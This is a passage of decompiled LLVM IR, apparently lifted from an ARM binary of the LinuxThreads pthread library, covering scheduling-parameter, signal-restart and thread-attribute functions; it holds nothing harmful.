  %v3_ddf0 = load i8, i8* %v2_ddf0, align 1
  %v4_ddf0 = zext i8 %v3_ddf0 to i32
  store i32 %v4_ddf0, i32* %r3.global-to-local, align 4
  %v2_ddf4 = icmp eq i8 %v3_ddf0, 0
  br i1 %v2_ddf4, label %bb6, label %bb7

bb6:                                              ; preds = %dec_label_pc_ddf0
  %v3_ddf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_ddf8, i32* %r4.global-to-local, align 4
  ret i32 %v9_ddf8

bb7:                                              ; preds = %dec_label_pc_ddf0
  %v1_ddfc = add i32 %v9_ddf8, 64
  %v2_ddfc = inttoptr i32 %v1_ddfc to i8*
  %v3_ddfc = load i8, i8* %v2_ddfc, align 1
  %v4_ddfc = zext i8 %v3_ddfc to i32
  store i32 %v4_ddfc, i32* %r2.global-to-local, align 4
  %v2_de00 = icmp eq i8 %v3_ddfc, 0
  br i1 %v2_de00, label %bb9, label %bb8

bb8:                                              ; preds = %bb7
  %v3_de04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de04, i32* %r4.global-to-local, align 4
  ret i32 %v9_ddf8

bb9:                                              ; preds = %bb7
  %v1_de08 = add i32 %v9_ddf8, 65
  %v2_de08 = inttoptr i32 %v1_de08 to i8*
  %v3_de08 = load i8, i8* %v2_de08, align 1
  %v4_de08 = zext i8 %v3_de08 to i32
  store i32 %v4_de08, i32* %r3.global-to-local, align 4
  %v7_de0c = icmp eq i8 %v3_de08, 1
  br i1 %v7_de0c, label %bb10, label %.thread2

bb10:                                             ; preds = %bb9
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb9, %bb10
  call void @__pseudo_cond_branch(i1 %v7_de0c, i32 ptrtoint (i32* @global_var_ecfc.433 to i32))
  %v0_de1c = load i32, i32* %r0.global-to-local, align 4
  %v1_de1c = add i32 %v0_de1c, 40
  %v2_de1c = inttoptr i32 %v1_de1c to i32*
  %v3_de1c = load i32, i32* %v2_de1c, align 4
  store i32 %v3_de1c, i32* %r3.global-to-local, align 4
  %v2_de20 = icmp eq i32 %v3_de1c, 0
  br i1 %v2_de20, label %bb11, label %bb12

bb11:                                             ; preds = %.thread2
  %v3_de24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de24, i32* %r4.global-to-local, align 4
  ret i32 %v0_de1c

bb12:                                             ; preds = %.thread2
  %v0_de28 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_de28, i32* %v2_de1c, align 4
  %v0_de30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_de30, i32* %r0.global-to-local, align 4
  %v2_de34 = call i32 @siglongjmp(i32 %v0_de30, i32 1)
  store i32 %v2_de34, i32* %r0.global-to-local, align 4
  ret i32 %v2_de34

; uselistorder directives
  uselistorder i32 %v9_ddf8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 7, 2, 4, 5, 8, 6, 0 }
  uselistorder i32* @global_var_2b17c.254, { 1, 0, 2 }
  uselistorder i32* @global_var_2b178.252, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_ddb8, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_de48 = load i32, i32* @r4, align 4
  store i32 %v3_de48, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_de50 = call i32 @_thread_self.3()
  %v1_de54 = add i32 %v0_de50, 36
  %v2_de54 = inttoptr i32 %v1_de54 to i32*
  %v3_de54 = load i32, i32* %v2_de54, align 4
  store i32 %v3_de54, i32* %r3.global-to-local, align 4
  %v2_de58 = icmp eq i32 %v3_de54, 0
  %v0_de5c = load i32, i32* %r4.global-to-local, align 4
  %v2_de5c = add i32 %v0_de50, 32
  %v3_de5c = inttoptr i32 %v2_de5c to i32*
  store i32 %v0_de5c, i32* %v3_de5c, align 4
  br i1 %v2_de58, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v3_de60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de60, i32* %r4.global-to-local, align 4
  ret i32 %v0_de50

bb3:                                              ; preds = %entry
  %v0_de64 = load i32, i32* %r3.global-to-local, align 4
  %v2_de6c = call i32 @siglongjmp(i32 %v0_de64, i32 1)
  ret i32 %v2_de6c

; uselistorder directives
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 ()* @_thread_self.3, { 6, 5, 4, 2, 1, 3, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_de78 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_de78, i32* @global_var_2b180.402, align 4
  ret i32 %v1_de78
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v3_de9c = urem i32 %arg1, 1024
  %v4_dea0 = mul nuw nsw i32 %v3_de9c, 16
  %v5_dea0 = add i32 %v4_dea0, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v2_deb4 = call i32 @__pthread_lock(i32 %v5_dea0, i32 0)
  %v0_deb8 = load i32, i32* @r5, align 4
  %v1_deb8 = add i32 %v0_deb8, 8
  %v2_deb8 = inttoptr i32 %v1_deb8 to i32*
  %v3_deb8 = load i32, i32* %v2_deb8, align 4
  store i32 %v3_deb8, i32* @r4, align 4
  %v2_debc = icmp eq i32 %v3_deb8, 0
  br i1 %v2_debc, label %dec_label_pc_ded0, label %dec_label_pc_dec4

dec_label_pc_dec4:                                ; preds = %entry
  %v1_dec4 = add i32 %v3_deb8, 16
  %v2_dec4 = inttoptr i32 %v1_dec4 to i32*
  %v3_dec4 = load i32, i32* %v2_dec4, align 4
  %v1_dec8 = load i32, i32* %r7.global-to-local, align 4
  %v9_dec8 = icmp eq i32 %v3_dec4, %v1_dec8
  br i1 %v9_dec8, label %dec_label_pc_dee0, label %dec_label_pc_ded0

dec_label_pc_ded0:                                ; preds = %dec_label_pc_dec4, %entry
  %v1_ded4 = call i32 @__pthread_unlock(i32 %v0_deb8)
  ret i32 3

dec_label_pc_dee0:                                ; preds = %dec_label_pc_dec4
  %v0_deec = call i32 @sched_setscheduler()
  %v3_def0 = icmp eq i32 %v0_deec, -1
  br i1 %v3_def0, label %dec_label_pc_def8, label %dec_label_pc_df0c

dec_label_pc_def8:                                ; preds = %dec_label_pc_dee0
  %v0_def8 = load i32, i32* @r5, align 4
  %v1_defc = call i32 @__pthread_unlock(i32 %v0_def8)
  %v0_df00 = call i32 @__errno_location()
  %v1_df04 = inttoptr i32 %v0_df00 to i32*
  %v2_df04 = load i32, i32* %v1_df04, align 4
  ret i32 %v2_df04

dec_label_pc_df0c:                                ; preds = %dec_label_pc_dee0
  %v0_df0c = load i32, i32* %r6.global-to-local, align 4
  %v2_df0c = icmp eq i32 %v0_df0c, 0
  br i1 %v2_df0c, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_df0c
  %v1_df10 = load i32, i32* %r8.global-to-local, align 4
  %v2_df10 = inttoptr i32 %v1_df10 to i32*
  %v3_df10 = load i32, i32* %v2_df10, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_df0c, %bb
  %storemerge = phi i32 [ %v3_df10, %bb ], [ 0, %dec_label_pc_df0c ]
  %v1_df18 = load i32, i32* @r4, align 4
  %v2_df18 = add i32 %v1_df18, 24
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  store i32 %storemerge, i32* %v3_df18, align 4
  %v0_df1c = load i32, i32* @r5, align 4
  %v1_df20 = call i32 @__pthread_unlock(i32 %v0_df1c)
  %v2_df28 = load i32, i32* @global_var_2a7a4.195, align 4
  %v1_df2c = icmp slt i32 %v2_df28, 0
  br i1 %v1_df2c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  ret i32 0

bb14:                                             ; preds = %bb12
  %v0_df38 = load i32, i32* @r4, align 4
  %v1_df38 = add i32 %v0_df38, 24
  %v2_df38 = inttoptr i32 %v1_df38 to i32*
  %v3_df38 = load i32, i32* %v2_df38, align 4
  %v1_df3c = call i32 @__pthread_manager_adjust_prio(i32 %v3_df38)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_df50 = load i32, i32* @r4, align 4
  store i32 %v3_df50, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v3_df60 = urem i32 %arg1, 1024
  %v4_df64 = mul nuw nsw i32 %v3_df60, 16
  %v5_df64 = add i32 %v4_df64, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %v5_df64, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v2_df78 = call i32 @__pthread_lock(i32 %v5_df64, i32 0)
  %v1_df7c = add i32 %v4_df64, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8)
  %v2_df7c = inttoptr i32 %v1_df7c to i32*
  %v3_df7c = load i32, i32* %v2_df7c, align 4
  %v2_df80 = icmp eq i32 %v3_df7c, 0
  br i1 %v2_df80, label %dec_label_pc_dfa0, label %dec_label_pc_df8c

dec_label_pc_df8c:                                ; preds = %entry
  %v1_df8c = add i32 %v3_df7c, 16
  %v2_df8c = inttoptr i32 %v1_df8c to i32*
  %v3_df8c = load i32, i32* %v2_df8c, align 4
  %v1_df90 = load i32, i32* %r4.global-to-local, align 4
  %v2_df90 = sub i32 %v3_df8c, %v1_df90
  store i32 %v2_df90, i32* %r6.global-to-local, align 4
  %v9_df90 = icmp eq i32 %v3_df8c, %v1_df90
  br i1 %v9_df90, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_df8c
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_dfa0

bb:                                               ; preds = %dec_label_pc_df8c
  %v2_df98 = icmp eq i32 %v2_df90, 0
  br i1 %v2_df98, label %dec_label_pc_dfac, label %dec_label_pc_dfa0

dec_label_pc_dfa0:                                ; preds = %.thread, %bb, %entry
  %v1_dfa0 = call i32 @__pthread_unlock(i32 %v5_df64)
  %v2_dfa8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dfa8, i32* %r4.global-to-local, align 4
  ret i32 3

dec_label_pc_dfac:                                ; preds = %bb
  %v1_dfac = add i32 %v3_df7c, 20
  %v2_dfac = inttoptr i32 %v1_dfac to i32*
  %v3_dfac = load i32, i32* %v2_dfac, align 4
  store i32 %v3_dfac, i32* @r4, align 4
  %v1_dfb4 = call i32 @__pthread_unlock(i32 %v5_df64)
  %v0_dfbc = call i32 @sched_getscheduler()
  store i32 %v0_dfbc, i32* %r5.global-to-local, align 4
  %v7_dfc4 = icmp eq i32 %v0_dfbc, -1
  br i1 %v7_dfc4, label %dec_label_pc_dfe0, label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_dfac
  %v0_dfd4 = call i32 @sched_getparam()
  %v3_dfd8 = icmp eq i32 %v0_dfd4, -1
  br i1 %v3_dfd8, label %dec_label_pc_dfe0, label %dec_label_pc_dfec

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_dfd4, %dec_label_pc_dfac
  %v0_dfe0 = call i32 @__errno_location()
  %v1_dfe4 = inttoptr i32 %v0_dfe0 to i32*
  %v2_dfe4 = load i32, i32* %v1_dfe4, align 4
  %v2_dfe8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dfe8, i32* %r4.global-to-local, align 4
  ret i32 %v2_dfe4

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfd4
  %v0_dfec = load i32, i32* %r6.global-to-local, align 4
  %v0_dff0 = load i32, i32* %r5.global-to-local, align 4
  %v1_dff0 = load i32, i32* %r8.global-to-local, align 4
  %v2_dff0 = inttoptr i32 %v1_dff0 to i32*
  store i32 %v0_dff0, i32* %v2_dff0, align 4
  %v2_dff4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dff4, i32* %r4.global-to-local, align 4
  ret i32 %v0_dfec

; uselistorder directives
  uselistorder i32 %v3_df8c, { 1, 0 }
  uselistorder i32 %v5_df64, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dfa0, { 1, 0, 2 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  %. = select i1 %tmp3, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp3, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  %v0_e014.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e014 = phi i32 [ 22, %entry ], [ %v0_e014.pre, %bb ]
  ret i32 %v0_e014

; uselistorder directives
  uselistorder i1 %tmp3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e01c = load i32, i32* %arg1, align 4
  %v2_e024 = inttoptr i32 %arg2 to i32*
  store i32 %v2_e01c, i32* %v2_e024, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg2, 3
  %. = select i1 %tmp, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_e038 = add i32 %arg1, 4
  %v7_e038 = inttoptr i32 %v6_e038 to i32*
  store i32 %arg2, i32* %v7_e038, align 4
  %v0_e03c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e03c = phi i32 [ 22, %entry ], [ %v0_e03c.pre, %bb ]
  ret i32 %v0_e03c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e044 = add i32 %arg1, 4
  %v2_e044 = inttoptr i32 %v1_e044 to i32*
  %v3_e044 = load i32, i32* %v2_e044, align 4
  store i32 %v3_e044, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  %. = select i1 %tmp3, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp3, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_e060 = add i32 %arg1, 12
  %v7_e060 = inttoptr i32 %v6_e060 to i32*
  store i32 %arg2, i32* %v7_e060, align 4
  %v0_e064.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e064 = phi i32 [ 22, %entry ], [ %v0_e064.pre, %bb ]
  ret i32 %v0_e064

; uselistorder directives
  uselistorder i1 %tmp3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e06c = add i32 %arg1, 12
  %v2_e06c = inttoptr i32 %v1_e06c to i32*
  %v3_e06c = load i32, i32* %v2_e06c, align 4
  store i32 %v3_e06c, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e07c = icmp eq i32 %arg2, 0
  br i1 %v2_e07c, label %dec_label_pc_e094, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %entry
  %v7_e084 = icmp eq i32 %arg2, 1
  %. = select i1 %v7_e084, i32 95, i32 22
  ret i32 %.

dec_label_pc_e094:                                ; preds = %entry
  %v2_e094 = add i32 %arg1, 16
  %v3_e094 = inttoptr i32 %v2_e094 to i32*
  store i32 0, i32* %v3_e094, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0a0 = add i32 %arg1, 16
  %v2_e0a0 = inttoptr i32 %v1_e0a0 to i32*
  %v3_e0a0 = load i32, i32* %v2_e0a0, align 4
  store i32 %v3_e0a0, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0b0 = add i32 %arg1, 20
  %v2_e0b0 = inttoptr i32 %v1_e0b0 to i32*
  %v3_e0b0 = load i32, i32* %v2_e0b0, align 4
  store i32 %v3_e0b0, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e0c4 = add i32 %arg1, 24
  %v3_e0c4 = inttoptr i32 %v2_e0c4 to i32*
  store i32 1, i32* %v3_e0c4, align 4
  %v2_e0c8 = add i32 %arg1, 28
  %v3_e0c8 = inttoptr i32 %v2_e0c8 to i32*
  store i32 %arg2, i32* %v3_e0c8, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0d4 = add i32 %arg1, 28
  %v2_e0d4 = inttoptr i32 %v1_e0d4 to i32*
  %v3_e0d4 = load i32, i32* %v2_e0d4, align 4
  store i32 %v3_e0d4, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %v2_e0e4 = icmp ugt i32 %arg2, 16383
  %. = select i1 %v2_e0e4, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %v2_e0e4, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v3_e0f0 = add i32 %arg1, 32
  %v4_e0f0 = inttoptr i32 %v3_e0f0 to i32*
  store i32 %arg2, i32* %v4_e0f0, align 4
  %v0_e0f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e0f4 = phi i32 [ 22, %entry ], [ %v0_e0f4.pre, %bb ]
  ret i32 %v0_e0f4

; uselistorder directives
  uselistorder i1 %v2_e0e4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0fc = add i32 %arg1, 32
  %v2_e0fc = inttoptr i32 %v1_e0fc to i32*
  %v3_e0fc = load i32, i32* %v2_e0fc, align 4
  store i32 %v3_e0fc, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_e10c = load i32, i32* @r4, align 4
  store i32 %v3_e10c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v0_e114 = call i32 @__GI_getpagesize()
  %v1_e118 = sub i32 2097152, %v0_e114
  store i32 %v0_e114, i32* %r2.global-to-local, align 4
  %v2_e120 = add i32 %tmp, 32
  %v3_e120 = inttoptr i32 %v2_e120 to i32*
  store i32 %v1_e118, i32* %v3_e120, align 4
  %v1_e12c = load i32, i32* %r4.global-to-local, align 4
  %v2_e12c = add i32 %v1_e12c, 12
  %v3_e12c = inttoptr i32 %v2_e12c to i32*
  store i32 1, i32* %v3_e12c, align 4
  %v1_e130 = load i32, i32* %r4.global-to-local, align 4
  %v2_e130 = inttoptr i32 %v1_e130 to i32*
  store i32 0, i32* %v2_e130, align 4
  %v1_e134 = load i32, i32* %r4.global-to-local, align 4
  %v2_e134 = add i32 %v1_e134, 4
  %v3_e134 = inttoptr i32 %v2_e134 to i32*
  store i32 0, i32* %v3_e134, align 4
  %v1_e138 = load i32, i32* %r4.global-to-local, align 4
  %v2_e138 = add i32 %v1_e138, 8
  %v3_e138 = inttoptr i32 %v2_e138 to i32*
  store i32 0, i32* %v3_e138, align 4
  %v1_e13c = load i32, i32* %r4.global-to-local, align 4
  %v2_e13c = add i32 %v1_e13c, 16
  %v3_e13c = inttoptr i32 %v2_e13c to i32*
  store i32 0, i32* %v3_e13c, align 4
  %v0_e140 = load i32, i32* %r2.global-to-local, align 4
  %v1_e140 = load i32, i32* %r4.global-to-local, align 4
  %v2_e140 = add i32 %v1_e140, 20
  %v3_e140 = inttoptr i32 %v2_e140 to i32*
  store i32 %v0_e140, i32* %v3_e140, align 4
  %v1_e144 = load i32, i32* %r4.global-to-local, align 4
  %v2_e144 = add i32 %v1_e144, 28
  %v3_e144 = inttoptr i32 %v2_e144 to i32*
  store i32 0, i32* %v3_e144, align 4
  %v1_e148 = load i32, i32* %r4.global-to-local, align 4
  %v2_e148 = add i32 %v1_e148, 24
  %v3_e148 = inttoptr i32 %v2_e148 to i32*
  store i32 0, i32* %v3_e148, align 4
  %v2_e14c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e14c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 2, 0, 1 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_e15c = call i32 @__GI_getpagesize()
  %v2_e164 = add i32 %v0_e15c, %arg2
  %v1_e16c = add i32 %v2_e164, -1
  %v2_e170 = udiv i32 %v1_e16c, %v0_e15c
  store i32 %v2_e170, i32* %r0.global-to-local, align 4
  %v2_e174 = mul i32 %v2_e170, %v0_e15c
  %v0_e178 = load i32, i32* %r6.global-to-local, align 4
  %v1_e178 = add i32 %v0_e178, 32
  %v2_e178 = inttoptr i32 %v1_e178 to i32*
  %v3_e178 = load i32, i32* %v2_e178, align 4
  %v3_e17c = icmp uge i32 %v2_e174, %v3_e178
  %. = select i1 %v3_e17c, i32 22, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  br i1 %v3_e17c, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v3_e188 = add i32 %v0_e178, 20
  %v4_e188 = inttoptr i32 %v3_e188 to i32*
  store i32 %v2_e174, i32* %v4_e188, align 4
  %v14_e18c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v14_e18c = phi i32 [ 22, %entry ], [ %v14_e18c.pre, %bb ]
  ret i32 %v14_e18c

; uselistorder directives
  uselistorder i1 %v3_e17c, { 1, 0 }
  uselistorder i32 %v0_e15c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_e190 = add i32 %arg1, 8
  store i32 %arg2, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  store i32 %v1_e190, i32* @r1, align 4
  %v0_e1a4 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v0_e1c0 = call i32 @sched_get_priority_max()
  store i32 %v0_e1c0, i32* %r6.global-to-local, align 4
  %v0_e1cc = call i32 @sched_get_priority_min()
  %v0_e1d0 = load i32, i32* @r5, align 4
  %v1_e1d0 = inttoptr i32 %v0_e1d0 to i32*
  %v2_e1d0 = load i32, i32* %v1_e1d0, align 4
  %v5_e1d8 = icmp slt i32 %v2_e1d0, %v0_e1cc
  br i1 %v5_e1d8, label %dec_label_pc_e1fc, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %entry
  %v1_e1dc = load i32, i32* %r6.global-to-local, align 4
  %v0_e1e0 = load i32, i32* @r4, align 4
  %v1_e1e0 = add i32 %v0_e1e0, 8
  store i32 %v1_e1e0, i32* @r0, align 4
  store i32 %v0_e1d0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v8_e1ec = icmp sgt i32 %v2_e1d0, %v1_e1dc
  br i1 %v8_e1ec, label %dec_label_pc_e1fc, label %dec_label_pc_e1f0

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e1dc
  %v0_e1f0 = call i32 @memcpy()
  ret i32 0

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e1dc, %entry
  ret i32 22
}

define i32 @_thread_self.5() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_e208 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_e20c = load i32, i32* @sp, align 4
  %v3_e20c = icmp ult i32 %v0_e20c, %v2_e208
  %v1_e210 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e210, i32* @r1, align 4
  br i1 %v3_e20c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_e22c, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_e22c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_e220 = load i32, i32* @global_var_2b170.180, align 4
  %v3_e224 = icmp ult i32 %v0_e20c, %v2_e220
  br i1 %v3_e224, label %bb4, label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %bb3
  %v2_e230 = load i32, i32* @global_var_2b174.182, align 4
  %v3_e234 = icmp ult i32 %v0_e20c, %v2_e230
  br i1 %v3_e234, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_e22c, %bb3
  %v2_e244 = load i32, i32* @global_var_2f558.186, align 4
  store i32 %v2_e244, i32* @r2, align 4
  %v3_e248 = and i32 %v1_e210, -2097152
  %v4_e248 = xor i32 %v3_e248, -2097152
  %v2_e250 = icmp eq i32 %v2_e244, 0
  %v1_e254 = sub i32 -477, %v4_e248
  br i1 %v2_e250, label %dec_label_pc_e260, label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %bb4
  %v1_e25c = call i32 @__pthread_find_self(i32 %v1_e254)
  br label %dec_label_pc_e260

dec_label_pc_e260:                                ; preds = %bb4, %dec_label_pc_e25c
  %v0_e260 = phi i32 [ %v1_e254, %bb4 ], [ %v1_e25c, %dec_label_pc_e25c ]
  %v1_e260 = add i32 %v0_e260, -3
  ret i32 %v1_e260

; uselistorder directives
  uselistorder i32 %v1_e254, { 1, 0 }
  uselistorder label %dec_label_pc_e260, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e280 = load i32, i32* @r4, align 4
  store i32 %v3_e280, i32* %stack_var_-16, align 4
  %v6_e280 = load i32, i32* @r5, align 4
  %v9_e280 = load i32, i32* @r6, align 4
  %v12_e280 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_e288 = call i32 @_thread_self.5()
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 60
  %v2_e28c = inttoptr i32 %v1_e28c to i32*
  %v3_e28c = load i32, i32* %v2_e28c, align 4
  store i32 %v3_e28c, i32* %r4.global-to-local, align 4
  store i32 %v0_e288, i32* %r5.global-to-local, align 4
  %v2_e2b02 = icmp eq i32 %v3_e28c, 0
  br i1 %v2_e2b02, label %dec_label_pc_e2b8, label %dec_label_pc_e298

dec_label_pc_e298:                                ; preds = %entry, %dec_label_pc_e2a0
  %v0_e2a0 = phi i32 [ %v3_e2ac, %dec_label_pc_e2a0 ], [ %v3_e28c, %entry ]
